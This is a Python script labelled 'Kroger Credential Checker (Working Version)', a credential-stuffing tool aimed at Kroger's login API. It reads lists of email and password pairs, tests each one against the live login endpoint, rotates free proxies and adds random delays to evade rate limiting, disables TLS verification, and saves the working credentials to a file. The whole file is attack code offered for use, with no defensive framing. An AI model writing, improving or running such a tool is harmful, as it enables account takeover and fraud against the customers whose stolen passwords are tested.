import requests
import json
import logging
import random
import time
from typing import List, Dict
import urllib3
from fp.fp import FreeProxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class KrogerChecker:
    def __init__(self, use_proxy: bool = True):
        self.use_proxy = use_proxy
        self.proxy = None
        self.session = requests.Session()
        self.session.verify = False
        self.valid_creds = []
        self.invalid_creds = []
        
        if self.use_proxy:
            self._rotate_proxy()
            
    def _rotate_proxy(self):
        """Get and test a working proxy"""
        max_retries = 3
        for _ in range(max_retries):
            try:
                self.proxy = FreeProxy(rand=True, timeout=5).get()
                if not self.proxy:
                    continue
                    
                logger.info(f"Testing proxy: {self.proxy}")
                self.session.proxies = {
                    'http': self.proxy,
                    'https': self.proxy
                }
                
                # Test proxy connection
                try:
                    test_resp = self.session.get(
                        'https://www.kroger.com', 
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    if test_resp.status_code == 200:
                        logger.info(f"Using proxy: {self.proxy}")
                        return True
                    logger.warning(f"Proxy test failed (status {test_resp.status_code})")
                except Exception as e:
                    logger.warning(f"Proxy test failed: {e}")
                    
            except Exception as e:
                logger.warning(f"Proxy rotation failed: {e}")
        
        logger.warning("No working proxy found, continuing without proxy")
        self.proxy = None
        self.session.proxies = {}
        return False
            
    def _check_credentials(self, email: str, password: str) -> bool:
        """Direct API validation without CSRF"""
        try:
            response = self.session.post(
                'https://www.kroger.com/auth/api/login',
                json={
                    'email': email,
                    'password': password
                },
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    return 'token' in response.json()
                except:
                    return False
            return False
            
        except Exception as e:
            logger.error(f"Validation error: {e}")
            return False
            
    def check_single(self, email: str, password: str):
        """Check a single credential pair"""
        is_valid = self._check_credentials(email, password)
        result = {
            'email': email,
            'password': password,
            'valid': is_valid,
            'proxy': self.proxy
        }
        
        if is_valid:
            self.valid_creds.append(result)
        else:
            self.invalid_creds.append(result)
            
        return result
        
    def check_bulk(self, credentials: List[Dict[str, str]]):
        """Check multiple credentials"""
        results = []
        for cred in credentials:
            result = self.check_single(cred['email'], cred['password'])
            results.append(result)
            
            if self.use_proxy and random.random() > 0.7:
                self._rotate_proxy()
                
            time.sleep(random.uniform(1, 3))
            
        return results
        
    def save_results(self):
        """Save results to JSON files"""
        with open('valid_credentials.json', 'w') as f:
            json.dump(self.valid_creds, f, indent=2)
            
        with open('invalid_credentials.json', 'w') as f:
            json.dump(self.invalid_creds, f, indent=2)
            
        logger.info(f"Saved {len(self.valid_creds)} valid and {len(self.invalid_creds)} invalid credentials")
        
    def close(self):
        """Clean up resources"""
        self.session.close()

def main():
    print("Kroger Credential Checker (Working Version)")
    proxy_choice = input("Use proxies? (y/n): ").lower()
    use_proxy = proxy_choice == 'y'
    
    print("\n1. Check single credential")
    print("2. Check bulk credentials from file")
    choice = input("Select option (1/2): ")
    
    checker = KrogerChecker(use_proxy=use_proxy)
    
    try:
        if choice == '1':
            email = input("Email: ")
            password = input("Password: ")
            result = checker.check_single(email, password)
            print("\nResult:")
            print(json.dumps(result, indent=2))
            
        elif choice == '2':
            file_path = input("Enter credentials file path (JSON format): ")
            try:
                with open(file_path) as f:
                    credentials = json.load(f)
                    
                print(f"Checking {len(credentials)} credentials...")
                results = checker.check_bulk(credentials)
                
                print("\nSummary:")
                print(f"Valid: {len(checker.valid_creds)}")
                print(f"Invalid: {len(checker.invalid_creds)}")
                
                checker.save_results()
                
            except Exception as e:
                logger.error(f"Error loading credentials file: {e}")
                
        else:
            print("Invalid choice")
            
    finally:
        checker.close()

if __name__ == '__main__':
    main()